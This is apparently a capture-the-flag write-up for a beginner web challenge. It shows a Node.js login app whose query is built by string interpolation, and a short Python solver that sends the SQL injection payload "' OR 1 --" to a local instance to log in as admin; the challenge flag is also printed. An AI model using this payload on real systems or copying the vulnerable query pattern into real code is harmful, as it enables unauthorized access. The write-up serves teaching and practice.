# [__Potent Quotes__](#)

### Description:
* We think our agency's login panel application might be vulnerable. Agent, could you assess the security of the website, and help us prevent malicious actors from gaining access to our confidential information?

### Objective:
* SQL injection

### Difficulty:
* `very easy`

### Flag:
* `HTB{sql_injecting_my_way_in}`

### Challenge:

<p align='center'>
  <img src='assets/preview.png'>
</p>

Looking at the router path on [`routes/index.js`](challenge/routes/index.js), we see the following:
* `/` redirecting to `/login`
* `/login` accepting `GET` to return the view, and `POST` to process the login functionality
* `/register` accepting `GET` to return the view, and `POST` to process the registration functionality

```javascript
router.get('/', (req, res) => {
	return res.redirect('/login');
});

router.get('/login', (req, res) => {
	return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {

    let { username, password } = req.body;

    if (username && password) {
        return db.login(username, password)
            .then(user => {
                
                if (user == 'admin') {
                    return res.send(response(fs.readFileSync('/app/flag').toString()))
                };

                if (!user) {
                    return res.send(response('This record does not exist'))
                };
                return res.send(response('You are not admin'));
            })
            .catch(() => res.send(response('Something went wrong')));
    }
    
    return re.send(response('Missing parameters'));
});

router.get('/register', (req, res) => {
	return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});	
```

On [`database.js`](challenge/database.js):
* the `connect()` method attaches to the database file that is passed as a constructor argument
* the `migrate()` method populates the database structure
* the `register()` method registers new users
* the `login()` method return the `username` field in the fetched row, if there isn't one it returns `false`, this method is susceptible to SQLi because of the lack of parametrization while constructing the query

```javascript
class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
    async connect() {
        this.db = await sqlite.open(this.db_file);
    }

    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
    }

    async register(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let smt = await this.db.prepare(`INSERT INTO users (username, password) VALUES (?, ?)`);
                resolve((await smt.run(user, pass)));
            } catch(e) {
                reject(e);
            }
        });
    }

    async login(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
                let row = await this.db.get(query);
                resolve(row !== undefined ? row.username : false);
            } catch(e) {
                reject(e);
            }
        });
    }
}

module.exports = Database;
```

On the `login` route we see that if we log in as `admin`, we'll be presented with the flag, but the `migrate()` method populates the `users` table with a random `32 byte` value as the password for the `admin` user. We'll utilise SQLi to be logged in as `admin` and retrieve the flag.

```javascript
router.post('/login', (req, res) => {

	let { username, password } = req.body;

	if (username && password) {
		return db.login(username, password)
			.then(user => {
                
				if (user == 'admin') {
                    return res.send(response(fs.readFileSync('/app/flag').toString()))
                };

				if (!user) {
                    return res.send(response('This record does not exist'))
                };
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
```

### Solver:

```python
import requests

host, port = 'localhost', 1337
HOST = 'http://%s:%d/' % (host, port)

r = requests.post(HOST + 'login', data={'username': "' OR 1 --", 'password': 'a'})
print(r.text)
```
